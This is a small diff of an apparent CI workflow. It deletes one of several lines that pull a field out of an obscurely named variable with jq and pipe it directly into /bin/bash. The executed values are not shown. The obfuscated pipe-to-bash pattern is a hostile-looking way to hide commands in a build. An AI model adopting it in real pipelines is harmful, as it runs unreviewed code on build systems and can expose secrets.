@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$g3" | jq -r .nwagt3577 | /bin/bash
           printf '%s' "$av613" | jq -r .b8 | /bin/bash
           echo $hbea82 | jq -r .cbbwu938 | /bin/bash
-          printf '%s' "$i7012" | jq -r .dzaur8851 | /bin/bash
           printf '%s' "$hcn82618" | jq -r .iucde3 | /bin/bash
 
       - name: Archive results
